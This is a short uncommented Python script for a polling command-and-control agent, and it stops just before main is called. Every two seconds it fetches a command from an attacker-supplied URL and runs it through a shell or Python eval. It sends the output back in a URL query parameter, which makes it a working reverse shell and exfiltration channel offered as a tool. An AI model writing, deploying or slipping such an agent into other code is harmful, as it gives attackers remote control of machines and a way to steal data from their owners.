#!/usr/bin/python3

import requests
from subprocess import Popen, PIPE
from sys import argv
import os
from time import sleep

def run_cmd(cmd):
	if " " in list(cmd) and cmd.split(" ")[0] == "cd":
		newdir = cmd.split(" ")[1]
		try:
			os.chdir(newdir)
			return "cd: "+newdir
		except:
			return "error"
	elif cmd == "exit":
		exit(0)
	elif " " in list(cmd) and cmd.split(" ")[0] == "py":
		parts = cmd.split(" ")
		parts.remove(parts[0])
		cmd = ' '.join(parts)
		res = eval(cmd)
		return res
	else:
		return Popen(cmd,stdout=PIPE,shell=True).communicate()[0].decode()


def main(argv=argv):
	try:
		url = argv[1]
	except:
		url = "http://127.0.0.1"
	data = ""
	while True:
		sleep(2)
		if len(data) > 0:
			cmd = requests.get(url+"/?data="+data).content
		else:
			cmd = requests.get(url).content
		data = run_cmd(cmd)

if __name__ == "__main__":
